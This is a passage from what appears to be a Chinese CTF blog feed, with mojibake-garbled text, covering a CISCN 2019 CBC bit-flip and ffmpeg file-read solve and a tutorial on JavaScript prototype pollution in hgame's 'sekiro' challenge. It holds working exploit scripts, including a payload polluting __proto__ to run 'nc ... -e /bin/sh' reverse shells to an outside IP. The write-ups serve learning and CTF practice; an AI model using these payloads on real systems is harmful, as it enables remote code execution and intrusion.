padding_oracle(&quot;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY2lZV3YrYW9NZi9EV2hvU1laaVFpWTJkanlpV1hJbGNqM2FRTndmajdLNnpvZGwzcUhsb2lPakdxWGhCRTN6UHVTeDMwY2lPdlpMZm5ya2tDZ0ZWRXFRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoic3c4SHByRENncFJHRWZwYzMxY29KME1DR1NkRm90SlgiLCJleHBpcmVfaW4iOjE1ODI5ODYwODB9&quot;)print(plain_text)</code></pre><p>ç”±äºpaddingéœ€è¦é¢‘ç¹è¯·æ±‚æœåŠ¡å™¨ï¼Œbuuçš„é¶æœºæœŸé—´ç»å¸¸å‡ºç°404ã€‚æ‰€ä»¥æˆ‘å¾—åœ¨æ¯æ¬¡å‡ºç°404æ—¶sleepåå¤šç§’â€¦â€¦å¤ªéš¾äº†ï¼Œè·‘äº†å¿«å‡ å°æ—¶æ‰å¥½ã€‚è·‘å®Œåå¾—åˆ°æ˜æ–‡ç»“æ„</p><pre><code class="json">{&quot;role&quot;:3,&quot;user_id&quot;:2,&quot;payload&quot;:&quot;sw8HprDCgpRGEfpc31coJ0MCGSdFotJX&quot;,&quot;expire_in&quot;:1582986080}</code></pre><p>æ—¢ç„¶å¦‚æ­¤ï¼ŒæŠŠroleæ”¹ä¸º1åº”è¯¥å°±å¯ä»¥è§£å†³æƒé™é—®é¢˜ã€‚æ‰€ä»¥cbcç¿»è½¬ä¸‹</p><pre><code class="python">import requestsimport base64import jsonhost = &quot;d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn&quot;def cbc_attack(key, block, origin_content, target_content):    user_key_decode = base64.b64decode(key)    #print(user_key_decode)    user_key_json_decode = json.loads(user_key_decode)    signed_key = user_key_json_decode[&#39;signed_key&#39;]    #print(signed_key)    cipher_o = base64.b64decode(signed_key)    #print(cipher_o)    if block &gt; 0:        iv_prefix = cipher_o[:block * 16]    else:        iv_prefix = b&#39;&#39;    iv = cipher_o[block * 16:16 + block * 16]    cipher = cipher_o[16 + block * 16:]    iv_array = bytearray(iv)    for i in range(0, 16):        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])    iv = bytes(iv_array)    #print(iv)    user_key_json_decode[&#39;signed_key&#39;] = base64.b64encode(iv_prefix + iv + cipher).decode(&#39;utf-8&#39;)    return base64.b64encode(bytes(json.dumps(user_key_json_decode), &quot;utf-8&quot;))def get_user_info(key):    r = requests.post(&quot;http://&quot; + host +&quot;/frontend/api/v1/user/info&quot;, headers={&quot;Key&quot;: key})    if r.json()[&#39;code&#39;] == 100:        print(&quot;è·å–æˆåŠŸï¼&quot;)    #return r.json()[&#39;data&#39;]def modify_role_plain(key, role):    user_key_decode = base64.b64decode(user_key)    user_key_json_decode = json.loads(user_key_decode)    user_key_json_decode[&#39;role&#39;] = role    return base64.b64encode(bytes(json.dumps(user_key_json_decode), &#39;utf-8&#39;)).decode(&#39;utf-8&#39;)print(&quot;ç¿»è½¬ Key:&quot;)user_key = cbc_attack(&quot;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY0JWN1BLdlJ2UVlGdVUydlppRXRKYlV0NkJWZGRlZUp0Rll2Nnl4dmxpaVhYMTdEcVZ6WXJjVjJEeTloekpaM29Gcm9yV0hUWDh0T2N0bjFITXFSSlBnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoidjByeEZqT2NJZW0xYzNta3o5Q2VINXZYdWxuZ0pES3AiLCJleHBpcmVfaW4iOjE1ODI5OTU2NDh9&quot;, 0, &#39;{&quot;role&quot;:3,&quot;user_&#39;, &#39;{&quot;role&quot;:1,&quot;user_&#39;)user_key = modify_role_plain(user_key, 1)print(user_key)print(&quot;æµ‹è¯•æ‹‰å–ç”¨æˆ·ä¿¡æ¯ï¼š&quot;)user_info = get_user_info(user_key)print(user_info)</code></pre><p>å¦‚æœæµ‹è¯•çš„è¿”å›æ²¡æœ‰é—®é¢˜çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿payloadä¿®æ”¹ä¸ºcookieç™»å½•äº†ã€‚å®é™…ä¸Šé¡µé¢æºç ä¸­ä¼šæç¤ºï¼Œé¢„è®¾ä¸€ä¸ªå€¼ä¸ºKeyçš„cookie,æ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ·»åŠ Keyå€¼cookie,æˆåŠŸç™»é™†ã€‚<br>æœ€åå°±æ˜¯ä¸€ä¸ªmiscå‹é¢˜ç›®äº†â€¦â€¦åå°å”¯ä¸€æ¯”è¾ƒæœ‰æ„æ€ çš„æ˜¯è§†é¢‘ä¸Šä¼ åŠŸèƒ½ï¼Œè€Œéšä¾¿ä¸Šä¼ åå†ä¸‹ä¸‹æ¥æˆ‘ä»¬çš„ä¸Šä¼ è§†é¢‘ï¼Œä¼šå‘ç°è§†é¢‘çš„MD5å€¼å‘ç”Ÿæ”¹å˜ã€‚è¯´æ˜å¯èƒ½æœåŠ¡å™¨å¯¹è§†é¢‘å¤„ç†è¿‡äº†ã€‚è¿™é‡Œèµµå¸ˆå‚…è®¾è®¡çš„æ˜¯ffmpegå¯¹è§†é¢‘å¤„ç†ã€‚æ‰€ä»¥å¯æ‰¾èƒ½å¤„ç†ffmpegæ¼æ´çš„è„šæœ¬<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/</a></p><pre><code>python gen_xbin_avi.py file:///flag test.avi</code></pre><p>ä¸Šä¼ åå†ä¸‹ä¸‹æ¥ï¼Œç¬¬ä¸€å¸§å°±æœ‰flagäº†ã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»æ­ç”µhgame-week4å­¦åŸå‹é“¾æ±¡æŸ“</title>
      <link href="2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºæ•°æ¨¡å¯¼è‡´æœ¬æ¥ä¸æ‰“ç®—åšweek4çš„é¢˜ç›®çš„ï¼Œä¸è¿‡å½“æ—¶ç…äº†ä¸€çœ¼sekiroè¿™é“é¢˜å¹¶ä¸”çœ‹å‡ºæ¥æ˜¯åŸå‹é“¾æ±¡æŸ“(ä¹Ÿæœ‰å«Node.jsæ±¡æŸ“,javasrciptåŸå‹é“¾æ±¡æŸ“çš„)ã€‚å¯æƒœå½“æ—¶æ²¡åšè¿‡ï¼Œæ²¡æ·±å…¥ä¹Ÿæ²¡åšå‡ºæ¥ã€‚ä»Šå¤©æŠ½ç©ºçœ‹äº†ä¸‹wpæ‰æ˜ç™½ã€‚å¹²è„†æŠŠå½“æ—¶æŸ¥é˜…èµ„æ–™å­¦åˆ°çš„çŸ¥è¯†æ€»ç»“ä¸‹ã€‚</p><p>æ—¶é—´çº¿ä¸Šçœ‹ï¼Œå›½å†…æœ€æ—©å‡ºç°çš„åŸå‹é“¾æ±¡æŸ“é¢˜ç›®åº”è¯¥æ˜¯å‡ºè‡ªPç‰›ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒçš„hard-the jsã€‚æ•´ä½“ä¸Šç®—æ¯”è¾ƒæ–°çš„æ´ã€‚åœ¨å„ç§æ¯”èµ›å‡ºç°é¢‘æ¬¡ä¸€èˆ¬ï¼ŒåŸå› æœ‰å¾ˆå¤šï¼Œè¿™ç‚¹ä¹‹åå†è°ˆã€‚å…¶ä¸»è¦æ˜¯å‰ç«¯å½¢å¼çš„æ”»å‡»ï¼Œè€Œä¸”æ¶‰åŠåˆ°javascriptçŸ¥è¯†æ›´å¤šäº›ï¼Œå› æ­¤è¿˜æ˜¯è¦ä»javascriptçš„è§’åº¦å­¦ä¹ ä¸‹ï¼š</p><a id="more"></a><h1 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h1><p>ç»å¸¸æœ‰è¿™æ ·ä¸€ç§è¯´æ³•ï¼šjavascriptä¸­ä¸‡ç‰©çš†å¯¹è±¡ã€‚è¿™ä¸ªè¯´æ³•ä¸¥æ ¼æ¥è®²ä¸å‡†ç¡®ï¼Œä½†æ˜¯å´ä½“ç°äº†jsè¯­æ³•åŠä½¿ç”¨ä¸Šçš„ç‰¹æ€§ã€‚javaScriptä¸­çš„å¯¹è±¡å…¶å®å°±æ˜¯ä¸€äº›é”®å€¼å¯¹çš„é›†åˆï¼Œæ¯ä¸€ä¸ªé”®å€¼å¯¹å«åšä¸€ä¸ªå±æ€§ï¼Œæ¯”å¦‚ï¼š<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å±æ€§"><br>æ­¤æ—¶å¯¹è±¡objå°±æœ‰äº†<code>name</code>ä¸<code>website</code>ä¸¤ä¸ªå±æ€§ã€‚ä½†å…¶å®å…¶è¾“å‡ºå†…å®¹å¹¶ä¸åªæœ‰è¿™ä¸¤ä¸ªï¼Œå®Œæ•´è¾“å‡ºçš„å¦‚ä¸‹ï¼š<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="__proto__"><br>å¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºå±æ€§ä¸­å‡ºç°äº†<code>proto</code>ä»¥åŠ<code>constructor</code>è¿™æ ·çš„å­—çœ¼ï¼Œé‚£ä»–ä»¬åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™è¦æåˆ°jsç»§æ‰¿çš„æ¦‚å¿µï¼Œç»§æ‰¿çš„æ•´ä¸ªè¿‡ç¨‹å°±ç§°ä¸ºè¯¥ç±»çš„åŸå‹é“¾ã€‚<br>ä»åˆšåˆšçš„ä¾‹å­å¯ä»¥çœ‹åˆ°ï¼Œä»objçš„<code>__proto__</code>ä¸­èƒ½æ˜ç™½å…¶çˆ¶ç±»æ˜¯Object.(Constructorè¿”å›ç”¨äºåˆ›å»ºè¿™ä¸ªå¯¹è±¡çš„å‡½æ•°)ï¼ŒåŒæ—¶è¿˜æœ‰è®¸å¤šå…¶ä»–å‡½æ•°ã€‚</p><p>å¯¹äºç±»ï¼Œæœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å¯¹åº”çš„å±æ€§ï¼Œå«åš<code>prototype</code>ã€‚ä¸”äºŒè€…ç­‰ä»·ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªpç‰›çš„ç»å…¸ä¾‹å­<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="protoä¸prototype"></p><p>ä»ç±»çš„è§’åº¦è®²ï¼Œ<code>prototype</code>æ˜¯å…¶ä¸€ä¸ªå±æ€§ï¼Œæ‰€æœ‰ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚ä½†æ˜¯ç±»æ‰€å®ä¾‹åŒ–çš„å¯¹è±¡å¹¶ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹ï¼Œæ‰€ä»¥æ‰æœ‰<code>__proto__</code><br>å‡ºç°ï¼Œä¸”ä¸€ä¸ªå¯¹è±¡çš„<strong>proto</strong>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§ã€‚</p><h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><p>è€ŒåŸå‹é“¾çš„ç‰¹æ€§å†³å®šäº†å…¶åœ¨jsç»§æ‰¿ä¸­çš„é‡è¦ä¹‹å¤„ã€‚è€Œå…¶ç‰¹æ€§è¡¨ç°åœ¨ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŸä¸€å±æ€§æ—¶ï¼š</p><pre><code>1.å¯¹è±¡(obj)ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§2.å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨obj.__proto__ä¸­å¯»æ‰¾å±æ€§3.å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨obj.__proto__.__proto__ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§</code></pre><p>ä»¥ä¸Šæœºåˆ¶è¢«ç§°ä¸ºjsçš„prototypeç»§æ‰¿é“¾ã€‚è€ŒåŸå‹é“¾æ±¡æŸ“å°±ä¸è¿™æœ‰å…³</p><p>æ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><pre><code class="javascript">let foo = {bar: 1}console.log(foo.bar)foo.__proto__.bar = 2console.log(foo.bar)let zoo = {}console.log(zoo.bar)</code></pre><p>ç»“æœä¸º<img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ±¡æŸ“"><br>å¯ä»¥å‘ç°ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡<code>__proto__</code>ä¿®æ”¹barå€¼åï¼Œå†åº¦å®ä¾‹åŒ–ä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶ï¼Œå…¶barå€¼ä»1å˜ä¸ºäº†2ã€‚åŸå› å¦‚ä¸‹ï¼šå‰é¢ä¿®æ”¹fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2.<br>é‚£ä¹ˆåé¢æˆ‘ä»¬zooç›¸å½“äºæ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªObjectç±»ï¼Œè‡ªç„¶æœ‰å±æ€§bar=2.</p><p>æ‰€ä»¥åŸå‹é“¾æ±¡æŸ“å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p>å¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“</p></blockquote><h1 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h1><p>åŸå‹é“¾æ±¡æŸ“çš„ä½¿ç”¨åœºæ™¯æˆ‘ä¹Ÿä¸ç†Ÿï¼Œä½†æ˜¯ç›®å‰æ ¹æ®é¢˜ç›®å‡ºç°çš„æƒ…å†µï¼Œä¸»è¦ä¸è¿™ä¸¤ä¸ªå‡½æ•°æœ‰å…³</p><pre><code>merge()clone()</code></pre><p>å¸¸ç”¨æºç å¦‚ä¸‹,å¯ä»¥çœ‹å‡ºcloneä¸mergeå¹¶æ— æœ¬è´¨åŒºåˆ«ï¼š</p><pre><code class="javascript">const merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }  return a}const clone = (a) =&gt; {  return merge({}, a);}</code></pre><p>æœ¬è´¨ä¸Šè¿™ä¸¤ä¸ªå‡½æ•°ä¼šæœ‰é£é™©ï¼Œå°±æ˜¯å› ä¸ºå­˜åœ¨èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œã€‚<br>ä½†æ˜¯è¦æƒ³å®ç°åŸå‹é“¾æ±¡æŸ“ï¼Œå…‰åªè¦é”®åå¯æ§æ˜¯ä¸å¤Ÿçš„ã€‚ä»¥ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸ºå‚è€ƒï¼š</p><pre><code class="javascript">function merge(target, source) {    for (let key in source) {        if (key in source &amp;&amp; key in target) {            merge(target[key], source[key])        } else {            target[key] = source[key]        }    }}</code></pre><p>å°è¯•æŠŠç¬¬äºŒä¸ªé”®åè®¾ä¸º<code>__proto__</code>å¹¶èµ‹å€¼bä¸º2ã€‚çœ‹çœ‹èƒ½ä¸èƒ½æŠŠobjectçš„å±æ€§bæ”¹ä¸º2ã€‚<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ±¡æŸ“å¤±è´¥"><br>å¯ä»¥çœ‹è§æœ€å<code>o3.b</code>è¿”å›çš„æ˜¯<code>undefined</code>,å¹¶æ²¡æœ‰æ±¡æŸ“æˆåŠŸã€‚<br>ä¸»è¦åŸå› å°±æ˜¯å› ä¸º<code>__proto__</code>æ²¡æœ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åã€‚è€Œè¿™å°±éœ€è¦æˆ‘ä¸Šé¢æåˆ°çš„å¦ä¸€ä¸ªæ¡ä»¶,ä»£ç å¦‚ä¸‹æ—¶ï¼š</p><pre><code class="javascript">let o1 = {}let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)</code></pre><p>å¦‚æœå­˜åœ¨<code>JSON.parse()</code>ï¼Œå°±èƒ½æˆåŠŸæŠŠ<code>__proto__</code>è§£ææˆé”®åäº†ã€‚<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æ±¡æŸ“æˆåŠŸ"></p><p>æœ‰äº†è¿™äº›åŸºç¡€ï¼Œå°±åŸºæœ¬èƒ½äº†è§£åŸå‹é“¾æ±¡æŸ“çš„åŸç†äº†ã€‚</p><h1 id="çœŸé¢˜"><a href="#çœŸé¢˜" class="headerlink" title="çœŸé¢˜"></a>çœŸé¢˜</h1><h2 id="hgame-sekiro"><a href="#hgame-sekiro" class="headerlink" title="hgame sekiro"></a>hgame sekiro</h2><p>å›å¤´æ¥çœ‹hgameä¸­sekiroè¿™é“é¢˜ï¼Œé¢˜ç›®ç»™å‡ºçš„å…³é”®æºç ä¸»è¦åœ¨ä¸€ä¸‹ä¸¤ä¸ªjsæ–‡ä»¶ä¸­<br>route/index.js</p><pre><code class="javascript">var express = require(&#39;express&#39;);var router = express.Router();var game = require(&#39;../utils/index&#39;);const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }  return a}const clone = (a) =&gt; {  return merge({}, a);}var Game = new game();router.get(&#39;/&#39;, function (req, res) {  res.render(&#39;index&#39;);});router.post(&#39;/action&#39;, function (req, res) {  if (!req.session.sekiro) {    res.end(&quot;Session required.&quot;)  }  if (!req.session.sekiro.alive) {    res.end(&quot;You dead.&quot;)  }  var body = JSON.parse(JSON.stringify(req.body));  var copybody = clone(body)  if (copybody.solution) {    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)  }  res.end(&quot;æäº¤æˆåŠŸ&quot;)})router.get(&#39;/attack&#39;, function (req, res) {  if (!req.session.sekiro) {    res.end(&quot;Session required.&quot;)  }  if (!req.session.sekiro.alive) {    res.end(&quot;You dead.&quot;)  }  req.session.sekiro.attackInfo = Game.getAttackInfo()  res.end(req.session.sekiro.attackInfo.method)})router.get(&#39;/info&#39;, function (req, res) {  if (typeof(req.query.restart) != &quot;undefined&quot; || !req.session.sekiro) {    req.session.sekiro = { &quot;health&quot;: 3000, posture: 0, alive: true }  }  res.json(req.session.sekiro);})module.exports = router;</code></pre><p>ä»¥åŠutil/index.js</p><pre><code class="javascript">function game() {    this.attacks = [        {            &quot;method&quot;: &quot;è¿ç»­ç å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,            &quot;solution&quot;: &quot;è¿ç»­æ ¼æŒ¡&quot;        },        {            &quot;method&quot;: &quot;æ™®é€šæ”»å‡»&quot;,            &quot;attack&quot;: 500,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,            &quot;solution&quot;: &quot;æ ¼æŒ¡&quot;        },        {            &quot;method&quot;: &quot;ä¸‹æ®µæ”»å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;è·³è·ƒè¸©å¤´&quot;        },        {            &quot;method&quot;: &quot;çªåˆºæ”»å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;è¯†ç ´&quot;        },        {            &quot;method&quot;: &quot;å·´ä¹‹é›·&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;é›·å&quot;        },    ]    this.getAttackInfo = function () {        return this.attacks[Math.floor(Math.random() * this.attacks.length)]    }    this.dealWithAttacks = function (sekiro, solution) {        if (sekiro.attackInfo.solution !== solution) {            sekiro.health -= sekiro.attackInfo.attack            if (sekiro.attackInfo.additionalEffect) {                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)            }        }        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0        if (sekiro.posture == 500 || sekiro.health == 0) {            sekiro.alive = false        }        return sekiro    }}module.exports = game;</code></pre><p>å¾ˆå®¹æ˜“å‘ç°index.jsä¸­ï¼Œåœ¨<code>/action</code>è¿™ä¸ªè·¯ç”±é‡Œï¼Œæœ‰<code>merge(),clone()</code>å‡½æ•°çš„å‡ºç°ã€‚äºæ˜¯æˆ‘ä»¬è·Ÿè¿›ä¸‹ï¼Œå‘ç°è¦åˆ°<code>dealWithAttacks()</code>è¿™ä¸ªå‡½æ•°å»ï¼Œäºæ˜¯å†å®¡è®¡ä¸‹å…³é”®ä»£ç ï¼š</p><pre><code class="javascript">if (sekiro.attackInfo.additionalEffect) {    var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)    sekiro = fn(sekiro)}</code></pre><p>è¿™é‡Œçš„<code>attackInfo.additionalEffect</code>å¦‚æœèƒ½è¢«æˆ‘ä»¬æ±¡æŸ“ï¼Œæ˜æ˜¾æ˜¯å¯ä»¥ç›´æ¥RCEçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ±¡æŸ“Objectç±»ï¼Œå½“é¢˜ç›®æ‰§è¡Œ<code>attackInfo.additionalEffect</code>æ‰¾ä¸åˆ°<code>additionalEffect</code>æ—¶ï¼Œå°±ä¼šç»§ç»­æ‰¾åˆ°åŸºç±»è¢«æ±¡æŸ“çš„è¿™ä¸€å±æ€§ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚</p><p>æ‰€ä»¥paylaodå¦‚ä¸‹</p><pre><code class="javascript">{&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;: {&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;). exec(&#39;nc vps-ip 8877 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>æˆ‘åœ¨ä½¿ç”¨bpä¼ å€¼æ—¶æ²¡å¼¹åˆ°shell,åæ¥åªèƒ½ç”¨pythonå†™è„šæœ¬äº†ï¼Œä¹Ÿè®¸æ˜¯JSONæ•°æ®çš„é—®é¢˜å§ã€‚</p><pre><code class="javascript">import requestsimport jsonurl=&#39;http://sekiro.hgame.babelfish.ink/action&#39;cookie={    &#39;session&#39;:&#39;s%3ACDDqh7q_XQ-rRAIB7W93PfE75p9oD7gS.UQuPEE0eikMrkIoAUaWJ3TFIibdRs72odZliCVcyzrk&#39;}headers={    &#39;Content-Type&#39;:&#39;application/json&#39;}payload={&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;: {&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;). exec(&#39;nc 120.27.246.202 8888 -e /bin/sh&#39;,function(){});&quot;}}res=requests.post(url,cookies=cookie,headers=headers,data=json.dumps(payload))print(res.text)</code></pre><p>ä½¿ç”¨bashå¼¹shellè²Œä¼¼æ²¡æˆï¼Œå¯èƒ½æ˜¯æŸäº›å¥‡æ€ªçš„é—®é¢˜<br><img 